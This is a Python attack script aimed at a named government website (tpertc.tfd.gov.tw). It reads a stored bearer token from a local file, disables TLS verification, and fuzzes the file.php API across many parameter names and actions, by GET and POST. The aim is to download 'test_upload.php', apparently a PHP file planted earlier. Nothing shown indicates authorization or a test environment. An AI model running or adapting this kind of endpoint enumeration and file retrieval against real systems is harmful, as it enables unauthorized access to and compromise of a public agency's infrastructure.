import requests, urllib3
urllib3.disable_warnings()

base = "https://tpertc.tfd.gov.tw"
token = open("/mnt/c/Users/Administrator/Desktop/JySecAI/erpc/data/femet_jwt.txt").read().strip()
headers = {"Authorization": f"Bearer {token}"}

# Try many parameter name variations for file.php download
params_to_try = ["fname", "file", "path", "name", "filename", "id",
                 "key", "url", "src", "download", "attachment"]

for p in params_to_try:
    r = requests.get(f"{base}/rtc/api/file.php?action=download&{p}=test_upload.php",
        headers=headers, verify=False, timeout=8)
    print(f"  download&{p}=test_upload.php: {r.status_code} {r.text[:80]}")

# Try POST for download
for p in params_to_try:
    r = requests.post(f"{base}/rtc/api/file.php?action=download",
        headers=headers, data={p: "test_upload.php"},
        verify=False, timeout=8)
    print(f"  POST download&{p}=test_upload.php: {r.status_code} {r.text[:80]}")

# Also try all actions with different param names
for action in ["download", "get", "read", "list", "fetch", "show", "view", "open", "getfile"]:
    for p in ["fname", "file", "path", "name", "filename", "id"]:
        r = requests.get(f"{base}/rtc/api/file.php?action={action}&{p}=test_upload.php",
            headers=headers, verify=False, timeout=8)
        if "get file error" in r.text:
            continue
        else:
            print(f"  action={action}&{p}=test_upload.php: {r.status_code} {r.text[:80]}")
